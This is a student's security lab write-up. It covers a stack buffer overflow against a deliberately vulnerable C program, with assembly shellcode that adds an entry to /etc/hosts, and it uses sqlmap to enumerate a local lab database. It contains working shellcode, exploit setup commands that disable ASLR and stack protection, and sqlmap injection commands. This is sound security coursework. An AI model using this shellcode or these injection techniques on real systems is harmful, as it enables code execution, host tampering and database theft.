# Lab 1, 22110074, Nguyen Le Phuong Thu, INSE_02FIE

## Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
 char buffer[16];
 strcpy(buffer,argv[1]);
 return 0;
}
```

and a shellcode in asm. This shellcode add a new entry in hosts file

```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux.
  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

### 1. Fire up docker-compose to run the docker conteiner `docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` and then change working directory to the folder have this file

![image](./img/run%20docker.png)

### 2. Compile with nasm and then link with ld to generate executable file

![image](/img/compile.png)

### 3. Dump to `test.o` to show information of this file

`objdump -d test.o`
![image](/img/objdump.png)

### 4. Get the hex string of shellcode

Run the script `for i in $(objdump -d test | grep "^ " | cut -f2);do echo -n '\x'$i; done; echo`
![image](/img/hex%20string.png)

### 5. Prepare for the lab environment

- Turn off OS's address space layout randomization `sudo sysctl -w kernel.randomize_va_space=0`
- Compile program with options to defeat stack protecting mechanism and code execution on stack `gcc lab1.c -o lab1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
![image](/img/prepare.png)

### 6. Stack frame 


![image](/img/stack.png)

> We have the byte of the buffer in this code is smaller than the byte of hex string of shellcode. So I use environment variables to exploit

### 7. Add shellcode to environment and get env address with C code

![image](/img/env.png)

### 8. Debug with gdb `gdb -q ./lab1.out`

![image](/img/gdb.png)

### 9. Find the address of env

`find /home/seed/seclabs/buffer-overflow/lab1`
![image](/img/find.png)

### 10. Run program in gdb with injecting argument

![image](/img/run.png)

## Task 2: Attack on the database of Vulnerable App from SQLi lab

- Start docker container from SQLi.
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.

### 1. Change working directory to folder of SQli

![image](/img/sqli.png)

### 2. Fire up the docker-compose to create the docker-container set for this lab

![image](/img/build%20sqli.png)



### 3. Install sqlmap
![image](/img/sqlmap.png)


**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
To retrieve information about all available databases, use
'''
sqlmap -u "http://localhost:3128/vulnerable_page.php?id=1" --dbs
'''

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
To list tables in a specific database
'''
sqlmap -u "http://localhost:3128/vulnerable_page.php?id=1" -D database_name --tables
'''

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
